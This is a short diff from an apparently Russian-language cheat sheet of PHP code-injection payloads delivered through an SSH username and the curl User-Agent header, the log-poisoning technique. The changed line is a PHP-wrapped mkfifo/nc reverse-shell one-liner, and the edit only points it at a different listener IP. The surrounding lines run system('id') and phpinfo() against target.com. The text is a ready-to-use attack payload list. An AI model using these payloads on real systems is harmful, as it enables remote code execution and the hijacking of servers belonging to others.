@@ -28,7 +28,7 @@ ssh <?php system('id'); ?>@ip
 ## Внедрение через User-Agent:
 curl -A "<?php phpinfo(); ?>" http://target.com
 curl -A "<?php system('id'); ?>" http://target.com
-curl -A "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f'); ?>" http://target.com
+curl -A "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.187.139 4444 >/tmp/f'); ?>" http://target.com
 
 ## Через nc:
 nc target.com 80
